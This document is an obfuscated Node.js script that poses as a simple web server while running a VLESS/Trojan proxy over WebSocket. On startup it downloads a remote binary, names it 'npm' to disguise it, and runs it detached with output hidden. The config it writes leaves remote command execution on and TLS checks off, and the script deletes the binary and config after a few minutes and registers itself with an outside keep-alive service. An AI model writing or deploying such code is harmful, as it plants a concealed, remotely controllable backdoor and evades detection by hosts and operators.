const _0x54a530=_0x2a6e;(function(_0x44c729,_0x229bd7){const _0x21b27f=_0x2a6e,_0x5d1a98=_0x44c729();while(!![]){try{const _0x508c0a=parseInt(_0x21b27f(0x14a))/0x1*(parseInt(_0x21b27f(0x172))/0x2)+-parseInt(_0x21b27f(0x175))/0x3*(-parseInt(_0x21b27f(0x11a))/0x4)+parseInt(_0x21b27f(0x180))/0x5*(parseInt(_0x21b27f(0x125))/0x6)+parseInt(_0x21b27f(0x11d))/0x7+-parseInt(_0x21b27f(0x14f))/0x8*(parseInt(_0x21b27f(0x188))/0x9)+-parseInt(_0x21b27f(0x121))/0xa*(parseInt(_0x21b27f(0x157))/0xb)+-parseInt(_0x21b27f(0x12e))/0xc*(parseInt(_0x21b27f(0x139))/0xd);if(_0x508c0a===_0x229bd7)break;else _0x5d1a98['push'](_0x5d1a98['shift']());}catch(_0x3284e1){_0x5d1a98['push'](_0x5d1a98['shift']());}}}(_0x5376,0xc1bdb));const os=require('os'),http=require(_0x54a530(0x128)),fs=require('fs'),axios=require(_0x54a530(0x158)),net=require(_0x54a530(0x127)),path=require(_0x54a530(0x189)),crypto=require(_0x54a530(0x186)),{Buffer}=require(_0x54a530(0x142)),{exec,execSync}=require(_0x54a530(0x123)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'3acc5ff8-2a2d-4bcf-b8cd-9cab20312ed3',NEZHA_SERVER=process[_0x54a530(0x134)][_0x54a530(0x11b)]||'',NEZHA_PORT=process['env'][_0x54a530(0x185)]||'',NEZHA_KEY=process[_0x54a530(0x134)]['NEZHA_KEY']||'',DOMAIN=process[_0x54a530(0x134)][_0x54a530(0x145)]||_0x54a530(0x150),AUTO_ACCESS=process[_0x54a530(0x134)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x54a530(0x14c)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x54a530(0x134)]['SUB_PATH']||'sub',NAME=process['env']['NAME']||'space',PORT=process['env'][_0x54a530(0x171)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x57143f=_0x54a530;try{const _0x3870b9=await axios[_0x57143f(0x133)](_0x57143f(0x13d)),_0x63f4af=_0x3870b9[_0x57143f(0x166)];ISP=(_0x63f4af['country']+'-'+_0x63f4af[_0x57143f(0x193)])[_0x57143f(0x170)](/ /g,'_');}catch(_0x2ed77c){ISP=_0x57143f(0x147);}};GetISP();const httpServer=http[_0x54a530(0x159)]((_0x3f64b6,_0x3425e4)=>{const _0x75f1ce=_0x54a530;if(_0x3f64b6[_0x75f1ce(0x124)]==='/'){const _0x1f8fd=path['join'](__dirname,_0x75f1ce(0x146));fs[_0x75f1ce(0x187)](_0x1f8fd,_0x75f1ce(0x117),(_0x111186,_0x3df60f)=>{const _0x5627ab=_0x75f1ce;if(_0x111186){_0x3425e4[_0x5627ab(0x16f)](0xc8,{'Content-Type':_0x5627ab(0x118)}),_0x3425e4[_0x5627ab(0x126)](_0x5627ab(0x13a));return;}_0x3425e4[_0x5627ab(0x16f)](0xc8,{'Content-Type':'text/html'}),_0x3425e4['end'](_0x3df60f);});return;}else{if(_0x3f64b6[_0x75f1ce(0x124)]==='/'+SUB_PATH){const _0x164a3e=NAME?NAME+'-'+ISP:ISP,_0x23f6ff=_0x75f1ce(0x12a)+UUID+'@bing.com:443?encryption=none&security=tls&sni='+DOMAIN+_0x75f1ce(0x122)+DOMAIN+_0x75f1ce(0x190),_0x112bf4=_0x75f1ce(0x184)+UUID+_0x75f1ce(0x18f)+DOMAIN+_0x75f1ce(0x122)+DOMAIN+_0x75f1ce(0x190),_0x4425e1=_0x23f6ff+'\x0a'+_0x112bf4,_0x5222dc=Buffer['from'](_0x4425e1)[_0x75f1ce(0x151)](_0x75f1ce(0x17e));_0x3425e4[_0x75f1ce(0x16f)](0xc8,{'Content-Type':_0x75f1ce(0x12b)}),_0x3425e4[_0x75f1ce(0x126)](_0x5222dc+'\x0a');}else _0x3425e4[_0x75f1ce(0x16f)](0x194,{'Content-Type':'text/plain'}),_0x3425e4[_0x75f1ce(0x126)](_0x75f1ce(0x140));}}),wss=new WebSocket[(_0x54a530(0x17a))]({'server':httpServer}),uuid=UUID[_0x54a530(0x170)](/-/g,''),DNS_SERVERS=[_0x54a530(0x177),_0x54a530(0x13c)];function resolveHost(_0x264f18){return new Promise((_0x342a88,_0x36dfc7)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x264f18)){_0x342a88(_0x264f18);return;}let _0x33e407=0x0;function _0x5e2eb3(){const _0x413d73=_0x2a6e;if(_0x33e407>=DNS_SERVERS['length']){_0x36dfc7(new Error(_0x413d73(0x162)+_0x264f18+_0x413d73(0x11f)));return;}const _0x235639=DNS_SERVERS[_0x33e407];_0x33e407++;const _0x3707e0=_0x413d73(0x160)+encodeURIComponent(_0x264f18)+_0x413d73(0x173);axios[_0x413d73(0x133)](_0x3707e0,{'timeout':0x1388,'headers':{'Accept':_0x413d73(0x165)}})[_0x413d73(0x130)](_0x5373e4=>{const _0x2a8108=_0x413d73,_0x3991c9=_0x5373e4['data'];if(_0x3991c9[_0x2a8108(0x161)]===0x0&&_0x3991c9[_0x2a8108(0x18b)]&&_0x3991c9[_0x2a8108(0x18b)][_0x2a8108(0x179)]>0x0){const _0x5eb048=_0x3991c9['Answer'][_0x2a8108(0x17d)](_0x3478d6=>_0x3478d6['type']===0x1);if(_0x5eb048){_0x342a88(_0x5eb048[_0x2a8108(0x166)]);return;}}_0x5e2eb3();})[_0x413d73(0x155)](_0x4ace74=>{_0x5e2eb3();});}_0x5e2eb3();});}function handleVlessConnection(_0x58606e,_0x1e3f6b){const _0x355312=_0x54a530,[_0x1bc43a]=_0x1e3f6b,_0x132765=_0x1e3f6b[_0x355312(0x132)](0x1,0x11);if(!_0x132765['every']((_0x42fd43,_0x423c17)=>_0x42fd43==parseInt(uuid[_0x355312(0x137)](_0x423c17*0x2,0x2),0x10)))return![];let _0x3d013d=_0x1e3f6b[_0x355312(0x132)](0x11,0x12)[_0x355312(0x191)]()+0x13;const _0x3f9cdf=_0x1e3f6b[_0x355312(0x132)](_0x3d013d,_0x3d013d+=0x2)[_0x355312(0x119)](0x0),_0x63488e=_0x1e3f6b['slice'](_0x3d013d,_0x3d013d+=0x1)[_0x355312(0x191)](),_0x2a64cf=_0x63488e==0x1?_0x1e3f6b[_0x355312(0x132)](_0x3d013d,_0x3d013d+=0x4)[_0x355312(0x131)]('.'):_0x63488e==0x2?new TextDecoder()[_0x355312(0x15e)](_0x1e3f6b[_0x355312(0x132)](_0x3d013d+0x1,_0x3d013d+=0x1+_0x1e3f6b[_0x355312(0x132)](_0x3d013d,_0x3d013d+0x1)[_0x355312(0x191)]())):_0x63488e==0x3?_0x1e3f6b[_0x355312(0x132)](_0x3d013d,_0x3d013d+=0x10)['reduce']((_0x7a29dd,_0x14d32b,_0x239d81,_0x59b80a)=>_0x239d81%0x2?_0x7a29dd[_0x355312(0x16e)](_0x59b80a[_0x355312(0x132)](_0x239d81-0x1,_0x239d81+0x1)):_0x7a29dd,[])[_0x355312(0x14b)](_0x1d327c=>_0x1d327c[_0x355312(0x119)](0x0)[_0x355312(0x151)](0x10))[_0x355312(0x131)](':'):'';_0x58606e[_0x355312(0x144)](new Uint8Array([_0x1bc43a,0x0]));const _0x3b1115=createWebSocketStream(_0x58606e);return resolveHost(_0x2a64cf)[_0x355312(0x130)](_0x21f5a6=>{const _0x3b2ac1=_0x355312;net[_0x3b2ac1(0x14d)]({'host':_0x21f5a6,'port':_0x3f9cdf},function(){const _0xb878ba=_0x3b2ac1;this[_0xb878ba(0x12f)](_0x1e3f6b[_0xb878ba(0x132)](_0x3d013d)),_0x3b1115['on']('error',()=>{})[_0xb878ba(0x16c)](this)['on']('error',()=>{})[_0xb878ba(0x16c)](_0x3b1115);})['on']('error',()=>{});})[_0x355312(0x155)](_0xd652c7=>{const _0x1f2bce=_0x355312;net[_0x1f2bce(0x14d)]({'host':_0x2a64cf,'port':_0x3f9cdf},function(){const _0x5d16fa=_0x1f2bce;this[_0x5d16fa(0x12f)](_0x1e3f6b[_0x5d16fa(0x132)](_0x3d013d)),_0x3b1115['on']('error',()=>{})[_0x5d16fa(0x16c)](this)['on'](_0x5d16fa(0x178),()=>{})[_0x5d16fa(0x16c)](_0x3b1115);})['on'](_0x1f2bce(0x178),()=>{});}),!![];}function handleTrojanConnection(_0x435e19,_0x5385fe){const _0x43ac0c=_0x54a530;try{if(_0x5385fe[_0x43ac0c(0x179)]<0x3a)return![];const _0x2c993f=_0x5385fe[_0x43ac0c(0x132)](0x0,0x38)[_0x43ac0c(0x151)](),_0x391133=[UUID];let _0xb602c9=null;for(const _0x222d45 of _0x391133){const _0x214d46=crypto[_0x43ac0c(0x143)]('sha224')['update'](_0x222d45)[_0x43ac0c(0x15d)](_0x43ac0c(0x13f));if(_0x214d46===_0x2c993f){_0xb602c9=_0x222d45;break;}}if(!_0xb602c9)return![];let _0x16cf43=0x38;_0x5385fe[_0x16cf43]===0xd&&_0x5385fe[_0x16cf43+0x1]===0xa&&(_0x16cf43+=0x2);const _0xf7cf07=_0x5385fe[_0x16cf43];if(_0xf7cf07!==0x1)return![];_0x16cf43+=0x1;const _0x462d3c=_0x5385fe[_0x16cf43];_0x16cf43+=0x1;let _0x370e54,_0x2cc591;if(_0x462d3c===0x1)_0x370e54=_0x5385fe[_0x43ac0c(0x132)](_0x16cf43,_0x16cf43+0x4)[_0x43ac0c(0x131)]('.'),_0x16cf43+=0x4;else{if(_0x462d3c===0x3){const _0x2d6fb9=_0x5385fe[_0x16cf43];_0x16cf43+=0x1,_0x370e54=_0x5385fe[_0x43ac0c(0x132)](_0x16cf43,_0x16cf43+_0x2d6fb9)[_0x43ac0c(0x151)](),_0x16cf43+=_0x2d6fb9;}else{if(_0x462d3c===0x4)_0x370e54=_0x5385fe[_0x43ac0c(0x132)](_0x16cf43,_0x16cf43+0x10)[_0x43ac0c(0x169)]((_0x53fe62,_0x41c546,_0x2efa5d,_0x59111)=>_0x2efa5d%0x2?_0x53fe62[_0x43ac0c(0x16e)](_0x59111[_0x43ac0c(0x132)](_0x2efa5d-0x1,_0x2efa5d+0x1)):_0x53fe62,[])[_0x43ac0c(0x14b)](_0x5dd6da=>_0x5dd6da['readUInt16BE'](0x0)['toString'](0x10))[_0x43ac0c(0x131)](':'),_0x16cf43+=0x10;else return![];}}_0x2cc591=_0x5385fe[_0x43ac0c(0x119)](_0x16cf43),_0x16cf43+=0x2;_0x16cf43<_0x5385fe[_0x43ac0c(0x179)]&&_0x5385fe[_0x16cf43]===0xd&&_0x5385fe[_0x16cf43+0x1]===0xa&&(_0x16cf43+=0x2);const _0x4372f6=createWebSocketStream(_0x435e19);return resolveHost(_0x370e54)['then'](_0xa7af30=>{const _0x2ea4f1=_0x43ac0c;net['connect']({'host':_0xa7af30,'port':_0x2cc591},function(){const _0x10e096=_0x2a6e;_0x16cf43<_0x5385fe['length']&&this[_0x10e096(0x12f)](_0x5385fe['slice'](_0x16cf43)),_0x4372f6['on'](_0x10e096(0x178),()=>{})[_0x10e096(0x16c)](this)['on']('error',()=>{})[_0x10e096(0x16c)](_0x4372f6);})['on'](_0x2ea4f1(0x178),()=>{});})[_0x43ac0c(0x155)](_0x2b086d=>{const _0x3a5d9f=_0x43ac0c;net[_0x3a5d9f(0x14d)]({'host':_0x370e54,'port':_0x2cc591},function(){const _0x2be66a=_0x3a5d9f;_0x16cf43<_0x5385fe[_0x2be66a(0x179)]&&this['write'](_0x5385fe[_0x2be66a(0x132)](_0x16cf43)),_0x4372f6['on'](_0x2be66a(0x178),()=>{})[_0x2be66a(0x16c)](this)['on']('error',()=>{})[_0x2be66a(0x16c)](_0x4372f6);})['on'](_0x3a5d9f(0x178),()=>{});}),!![];}catch(_0x4a7734){return![];}}wss['on']('connection',(_0x135aa0,_0x2d89d6)=>{const _0xfab5bf=_0x54a530,_0x2ddd80=_0x2d89d6[_0xfab5bf(0x124)]||'';_0x135aa0[_0xfab5bf(0x181)](_0xfab5bf(0x16a),_0x2d7614=>{const _0x51945d=_0xfab5bf;if(_0x2d7614[_0x51945d(0x179)]>0x11&&_0x2d7614[0x0]===0x0){const _0x56607d=_0x2d7614['slice'](0x1,0x11),_0x213d85=_0x56607d['every']((_0x570e8f,_0x4f1f45)=>_0x570e8f==parseInt(uuid['substr'](_0x4f1f45*0x2,0x2),0x10));if(_0x213d85){!handleVlessConnection(_0x135aa0,_0x2d7614)&&_0x135aa0[_0x51945d(0x174)]();return;}}!handleTrojanConnection(_0x135aa0,_0x2d7614)&&_0x135aa0[_0x51945d(0x174)]();})['on'](_0xfab5bf(0x178),()=>{});});function _0x2a6e(_0x6ac08a,_0x55d618){_0x6ac08a=_0x6ac08a-0x117;const _0x537699=_0x5376();let _0x2a6e4a=_0x537699[_0x6ac08a];return _0x2a6e4a;}function _0x5376(){const _0x39d8ce=['crypto','readFile','243pmHWJx','path','error:\x20','Answer','Server\x20is\x20running\x20on\x20port\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2053','@bing.com:443?security=tls&sni=','&path=/','readUInt8','https://arm64.ssss.nyc.mn/agent','asOrganization','utf8','text/html','readUInt16BE','46268FxMAZs','NEZHA_SERVER','https://amd64.ssss.nyc.mn/v1','1010079iCDCrG','split','\x20with\x20all\x20DNS\x20servers','2083','424910sPktDN','&fp=chrome&type=ws&host=','child_process','url','8619378AFOoVH','end','net','http','aarch64','vless://','text/plain','listen','chmod\x20+x\x20npm','7323216dZJmjp','write','then','join','slice','get','env','stream','arch','substr','includes','13zKSVIf','Hello\x20world!','npm\x20is\x20running','1.1.1.1','https://speed.cloudflare.com/meta','true','hex','Not\x20Found\x0a','/bin/bash','buffer','createHash','send','DOMAIN','index.html','Unknown','finish','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1ofwyRe','map','WSPATH','connect','createWriteStream','53616qstnMz','bing.com','toString','https://arm64.ssss.nyc.mn/v1','\x20-p\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','catch','false','33UniOGa','axios','createServer','unlink','arm64','--tls','digest','decode','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://dns.google/resolve?name=','Status','Failed\x20to\x20resolve\x20','config.yaml','pop','application/dns-json','data','https://','npm\x20download\x20successfully','reduce','message','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','pipe','https://oooo.serv00.net/add-url','concat','writeHead','replace','PORT','239662ICyqMW','&type=A','close','3vkdvBQ','2087','8.8.4.4','error','length','Server','application/json','log','find','base64','npm\x20running\x20error:','5mQfOUP','once','2096','https://amd64.ssss.nyc.mn/agent','trojan://','NEZHA_PORT'];_0x5376=function(){return _0x39d8ce;};return _0x5376();}const getDownloadUrl=()=>{const _0x44d3c4=_0x54a530,_0x1ae140=os[_0x44d3c4(0x136)]();return _0x1ae140==='arm'||_0x1ae140===_0x44d3c4(0x15b)||_0x1ae140===_0x44d3c4(0x129)?!NEZHA_PORT?_0x44d3c4(0x152):_0x44d3c4(0x192):!NEZHA_PORT?_0x44d3c4(0x11c):_0x44d3c4(0x183);},downloadFile=async()=>{const _0xce2dbb=_0x54a530;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x16f4bb=getDownloadUrl(),_0x313226=await axios({'method':'get','url':_0x16f4bb,'responseType':_0xce2dbb(0x135)}),_0x28811d=fs[_0xce2dbb(0x14e)]('npm');return _0x313226['data'][_0xce2dbb(0x16c)](_0x28811d),new Promise((_0x4a6add,_0x535a23)=>{const _0x1f52f1=_0xce2dbb;_0x28811d['on'](_0x1f52f1(0x148),()=>{const _0x28cca0=_0x1f52f1;console[_0x28cca0(0x17c)](_0x28cca0(0x168)),exec(_0x28cca0(0x12d),_0x69ed93=>{if(_0x69ed93)_0x535a23(_0x69ed93);_0x4a6add();});}),_0x28811d['on'](_0x1f52f1(0x178),_0x535a23);});}catch(_0x7056f1){throw _0x7056f1;}},runnz=async()=>{const _0x3ccb22=_0x54a530;try{const _0x591583=execSync(_0x3ccb22(0x16b),{'encoding':'utf-8'});if(_0x591583['trim']()!==''){console['log']('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0xdcee12){}await downloadFile();let _0x4f520a='',_0x5be660=['443','8443',_0x3ccb22(0x182),_0x3ccb22(0x176),_0x3ccb22(0x120),_0x3ccb22(0x18e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1d6bb8=_0x5be660[_0x3ccb22(0x138)](NEZHA_PORT)?_0x3ccb22(0x15c):'';_0x4f520a='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x3ccb22(0x153)+NEZHA_KEY+'\x20'+_0x1d6bb8+_0x3ccb22(0x18d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4a5298=NEZHA_SERVER[_0x3ccb22(0x138)](':')?NEZHA_SERVER[_0x3ccb22(0x11e)](':')[_0x3ccb22(0x164)]():'',_0x2748f5=_0x5be660[_0x3ccb22(0x138)](_0x4a5298)?_0x3ccb22(0x13e):_0x3ccb22(0x156),_0x3743dd='client_secret:\x20'+NEZHA_KEY+_0x3ccb22(0x149)+NEZHA_SERVER+_0x3ccb22(0x154)+_0x2748f5+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x3ccb22(0x163),_0x3743dd);}_0x4f520a=_0x3ccb22(0x15f);}else{console['log']('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x4f520a,{'shell':_0x3ccb22(0x141)},_0x5f1c34=>{const _0x152a9f=_0x3ccb22;if(_0x5f1c34)console[_0x152a9f(0x178)](_0x152a9f(0x17f),_0x5f1c34);else console[_0x152a9f(0x17c)](_0x152a9f(0x13b));});}catch(_0x4bb6a0){console[_0x3ccb22(0x178)](_0x3ccb22(0x18a)+_0x4bb6a0);}};async function addAccessTask(){const _0x7c7fa8=_0x54a530;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x34bc50=_0x7c7fa8(0x167)+DOMAIN+'/'+SUB_PATH;try{const _0x492545=await axios['post'](_0x7c7fa8(0x16d),{'url':_0x34bc50},{'headers':{'Content-Type':_0x7c7fa8(0x17b)}});console[_0x7c7fa8(0x17c)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x73df85){}}const delFiles=()=>{const _0x383705=_0x54a530;fs[_0x383705(0x15a)]('npm',()=>{}),fs[_0x383705(0x15a)](_0x383705(0x163),()=>{});};httpServer[_0x54a530(0x12c)](PORT,()=>{const _0x5a58a9=_0x54a530;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5a58a9(0x17c)](_0x5a58a9(0x18c)+PORT);});